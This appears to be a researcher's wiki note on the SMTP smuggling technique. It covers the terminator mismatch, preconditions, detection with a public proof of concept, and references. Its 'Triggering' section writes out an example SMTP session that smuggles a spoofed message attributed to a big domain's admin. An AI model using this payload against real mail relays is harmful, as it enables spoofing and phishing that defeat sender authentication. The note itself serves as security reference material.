---
title: SMTP smuggling
slug: smtp-smuggling
created_utc: 2026-05-13T00:00:00Z
updated_utc: 2026-05-13T00:00:00Z
tags: [technique/server-side, technique/smtp]
inbound: []
---

# SMTP smuggling

PortSwigger Top 10 2023.

## Pattern
SMTP message-end terminator per spec is `\r\n.\r\n`. Some servers also
accept `\n.\n` or `\r.\r`. Mismatch between sending relay (which is
SPF-allowed for big-domain.com) and receiving server lets attacker tunnel
a second message attributed to big-domain.com inside the first → SPF /
DKIM / DMARC alignment defeated.

## Preconditions
- Outbound relay permissive on terminators.
- Receiving server strict on different terminator.
- Mismatch creates smuggling window.

## Detection
- Use SEC Consult's `smtp-smuggling` PoC against candidate relays.
- Test with `\n.\n` and `\r.\r` body endings.

## Triggering
```
MAIL FROM: <foo@bigdomain.com>
RCPT TO: <victim@target.com>
DATA
First message body
.
\nMAIL FROM: <admin@bigdomain.com>\nRCPT TO: <victim@target.com>\nDATA\nSpoofed message attributed to bigdomain admin\n.\n
QUIT
```

## Related
- [[hop-by-hop-smuggling]]
- [[akamai-edge-smuggling]]
- BIMI-protocol abuse (Ep 48 Sam Erb) — separate but adjacent class.

## Seen in the wild
- PortSwigger Top 10 2023.
- Critical Thinking Podcast Ep 60.

## References
- SEC Consult — SMTP smuggling 2023 writeup
- portswigger.net/research/top-10-web-hacking-techniques-of-2023
- Critical Thinking Podcast Ep 60
